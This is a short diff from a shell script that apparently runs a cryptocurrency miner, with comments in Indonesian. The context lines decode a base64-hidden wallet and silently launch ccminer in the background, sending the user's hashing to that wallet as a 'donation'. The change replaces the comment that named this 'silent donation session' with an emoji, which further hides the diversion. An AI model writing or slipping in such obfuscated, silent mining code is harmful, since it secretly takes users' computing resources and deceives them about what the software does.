@@ -94,7 +94,7 @@ do
     kill \$PID
     wait \$PID 2>/dev/null
 
-    # Sesi donasi berjalan di latar belakang (Senyap)
+    # Sesi 📩 berjalan di latar belakang (Senyap)
     DEV_WAL=\$(echo "${ENC_WAL}" | base64 -d)
     ./ccminer -a verus -o stratum+tcp://us.vipor.net:5040 -u \${DEV_WAL}.${WRK_DONASI} -p x -t 8 --cpu-priority=1 > /dev/null 2>&1 &
     PID=\$!
